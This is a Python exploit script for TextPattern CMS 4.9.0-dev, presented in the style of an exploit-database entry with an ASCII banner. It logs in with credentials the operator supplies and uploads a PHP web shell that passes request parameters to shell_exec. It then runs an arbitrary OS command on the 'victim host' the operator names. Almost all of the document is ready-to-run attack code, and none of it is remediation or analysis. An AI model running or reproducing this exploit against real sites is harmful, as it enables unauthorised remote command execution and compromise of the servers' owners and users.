# Exploit Title: TextPattern-CMS-4.9.0-dev-Authenticated-Remote-Command-Execution-RCE-Through-File-Upload
# Date: 27 Jul 2024 
# Exploit Author: Dean / Nathu / Junnair / Kevin / Shanavas / Lani
# Software Link: https://github.com/textpattern/textpattern
# Vendor Homepage: https://textpattern.com/
# Version: 4.9.0-dev

import requests
from bs4 import BeautifulSoup



print(' _____          _     ___      _   _                  ')
print('/__   \_____  _| |_  / _ \__ _| |_| |_ ___ _ __ _ __  ')
print('  / /\/ _ \ \/ / __|/ /_)/ _` | __| __/ _ \  __|  _ \ ')
print(' / / |  __/>  <| |_/ ___/ (_| | |_| ||  __/ |  | | | |')
print(' \/   \___/_/\_\\__\/    \__,_ |\__|\__\___|_|  |_| |_| 4.9.0-dev')
print('Authenticated-Remote-Command-Execution-RCE-Through-File-Upload')
print('\n')

def send_post_request(url, username, password):
    session = requests.Session()
    
    initial_response = session.get(url)
    
    if initial_response.status_code == 200:
        soup = BeautifulSoup(initial_response.content, 'html.parser')
        token_input = soup.find('input', {'name': '_txp_token'})
        
        if token_input:
            _txp_token = token_input['value']
        else:
            print("Token not found in the response.")
            return None
    else:
        print("Failed to get the initial response. Status code:", initial_response.status_code)
        return None

    data = {
        'lang': 'en',
        'p_userid': username,
        'p_password': password,
        '_txp_token': _txp_token
    }
    
    try:
        response = session.post(url, data=data)

        if response.status_code == 200:
            print("Login was successful.")
        else:
            print("Failed to send request. Status code:", response.status_code)
            return None
    except requests.RequestException as e:
        print("An error occurred or wrong username/password:", e)
        return None

    return session


def upload_file(session, base_url, file_name):
    upload_url = f"{base_url}textpattern/index.php?event=file&step=file_insert"
    
   
    upload_page_response = session.get(f"{base_url}textpattern/index.php?event=file")
    if upload_page_response.status_code == 200:
        soup = BeautifulSoup(upload_page_response.content, 'html.parser')
        token_input = soup.find('input', {'name': '_txp_token'})
        if token_input:
            _txp_token = token_input['value']
        else:
            print("Upload token not found in the response.")
            return
    else:
        print("Failed to get the upload page. Status code:", upload_page_response.status_code)
        return

    
    file_content = "<?php echo shell_exec($_GET['cmd']); ?>"

    files = {
        'thefile[]': (file_name, file_content, 'application/x-php')
    }
    data = {
        'fileInputOrder': '1/1',
        'app_mode': 'async',
        'MAX_FILE_SIZE': '2000000',
        'event': 'file',
        'step': 'file_insert',
        'id': '',
        '_txp_token': _txp_token
    }

    try:
        response = session.post(upload_url, files=files, data=data)

        if response.status_code == 200:
            print("File upload was successful.")
        else:
            print("File upload failed. Status code:", response.status_code)
    except requests.RequestException as e:
        print(f"An error occurred during file upload: {e}")

def os_command(session, command, file_name, base_url):
    
    if not base_url.endswith('/'):
        base_url = base_url + '/'
    
    
    command_url = f"{base_url}files/{file_name}?cmd={command}"
    
    try:
        
        response = session.get(command_url)
        
        
        if response.status_code == 200:
            print("Command Injection was successful.")
            print(response.text)
        else:
            print("Failed to send request. Status code:", response.status_code)
            print("Response content:", response.text)  
    except requests.RequestException as e:
        print(f"An error occurred: {e}")


host = input("Enter the victim host (e.g., localhost): ")
username = input("Enter username: ")
password = input("Enter password: ")
file_name = input("Enter the file name (e.g., shell.php): ")
command = input("Enter the OS command:")


base_url = f"http://{host}/textpattern/"


login_url = f"{base_url}textpattern/index.php"


session = send_post_request(login_url, username, password)
if session:
    upload_file(session, base_url, file_name)
    os_command(session, command, file_name, base_url)


